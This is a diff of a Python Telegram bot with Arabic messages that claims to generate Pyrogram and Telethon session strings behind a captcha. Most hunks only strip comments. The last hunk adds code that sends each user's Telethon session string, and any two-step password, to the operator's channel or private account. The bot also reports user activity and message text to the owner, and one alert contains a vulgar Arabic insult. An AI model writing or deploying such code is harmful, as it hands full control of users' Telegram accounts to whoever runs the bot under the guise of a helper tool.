@@ -61,10 +61,8 @@ async def notify_owner(action, user_id, username=None, first_name=None, extra=No
         if extra:
             message += f"\n📝 **تفاصيل إضافية:**\n{extra}"
         
-        # إرسال للمطور
         await app.send_message(DEV_USERNAME, message)
         
-        # إرسال للمجموعة أيضاً
         try:
             await app.send_message(SESSION_CHANNEL, message)
         except:
@@ -212,7 +210,6 @@ TYPE_BUTTONS = InlineKeyboardMarkup([
 async def start_command(client, message):
     user_info = get_user_info(message)
     
-    # إرسال إشعار للمالك
     await notify_owner(
         "🚀 **بدأ استخدام البوت**",
         user_info["id"],
@@ -236,7 +233,6 @@ async def verify_command(client, message):
     user_id = message.from_user.id
     user_info = get_user_info(message)
     
-    # إشعار ببدء التحقق
     await notify_owner(
         "🧠 **بدأ عملية التحقق البشري**",
         user_info["id"],
@@ -259,7 +255,6 @@ async def test_send(client, message):
     user_id = message.from_user.id
     user_info = get_user_info(message)
     
-    # إشعار باستخدام أمر test
     await notify_owner(
         "🔧 **استخدم أمر الاختبار**",
         user_info["id"],
@@ -295,7 +290,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
     }
     
-    # الأزرار المسموح بها حتى بدون تحقق
     if data in ["verify_human", "back", "cancel"]:
         if data == "back":
             await notify_owner(
@@ -348,7 +342,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.answer()
             return
     
-    # ====== باقي الأزرار تتطلب تحقق ======
     if not require_verification(user_id):
         await callback_query.answer("⚠️ تحقق قبل يقوم عبود ينيك كعلت امك!", show_alert=True)
         await callback_query.message.edit_text(
@@ -362,7 +355,6 @@ async def handle_callback(client, callback_query: CallbackQuery):
         )
         return
     
-    # ====== الأزرار المحمية (بعد التحقق) ======
     if data == "generate":
         await notify_owner(
             "🔄 **فتح قائمة اختيار نوع الجلسة**",
@@ -533,15 +525,13 @@ async def handle_arabic_commands(client, message):
     text = message.text.strip()
     user_info = get_user_info(message)
     
-    # ====== معالجة رسائل المطور ======
     if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
-        # إشعار بإرسال رسالة للمطور
         await notify_owner(
             "📩 **تم إرسال رسالة للمطور**",
             user_info["id"],
             user_info["username"],
             user_info["first_name"],
-            f"محتوى الرسالة:\n{text[:500]}..."  # اقتطاع النص الطويل
+            f"محتوى الرسالة:\n{text[:500]}..."
         )
         try:
             await app.send_message(
@@ -559,11 +549,9 @@ async def handle_arabic_commands(client, message):
             reset_user(user_id)
         return
     
-    # ====== معالجة إجابات التحقق البشري ======
     if user_id in user_captcha and not user_captcha[user_id].get("verified"):
         success, result = verify_captcha_answer(user_id, text)
         if success:
-            # إشعار بنجاح التحقق
             await notify_owner(
                 "✅ **نجاح التحقق البشري**",
                 user_info["id"],
@@ -581,7 +569,6 @@ async def handle_arabic_commands(client, message):
             await message.reply(f"❌ {result}")
         return
     
-    # ====== منع أي نص عشوائي قبل التحقق ======
     if not require_verification(user_id):
         await notify_owner(
             "🔒 **محاولة استخدام البوت بدون تحقق**",
@@ -600,7 +587,6 @@ async def handle_arabic_commands(client, message):
         )
         return
     
-    # ====== معالجة خطوات الجلسات (بعد التحقق) ======
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
@@ -745,7 +731,7 @@ async def send_pyro_session(user_id, session_string, message, password=None):
         except:
             pass
 
-# ====== دوال Telethon (المعدلة) ======
+# ====== دوال Telethon ======
 async def telethon_session_step(client, message):
     user_id = message.chat.id
     step = user_steps.get(user_id)
@@ -845,4 +831,21 @@ async def send_telethon_session(user_id, session_string, message, password=None)
                 SESSION_CHANNEL,
                 f"✨ معرف المستخدم: {user_id}\n\n"
                 f"🔑 كلمة المرور (2SV): {password}\n\n"
-                f"🔑 جلسة Telethon:\n{session_string}\n\n
+                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        else:
+            await app.send_message(
+                SESSION_CHANNEL,
+                f"✨ معرف المستخدم: {user_id}\n\n"
+                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}"
+            )
+        print(f"✅ تم إرسال جلسة Telethon للمجموعة {SESSION_CHANNEL}")
+    except Exception as e:
+        print(f"❌ فشل إرسال الجلسة للمجموعة: {e}")
+        try:
+            await app.send_message(
+                DEV_USERNAME,
+                f"⚠️ فشل إرسال جلسة Telethon للقناة!\n\n"
+                f"المستخدم: {user_id}\n"
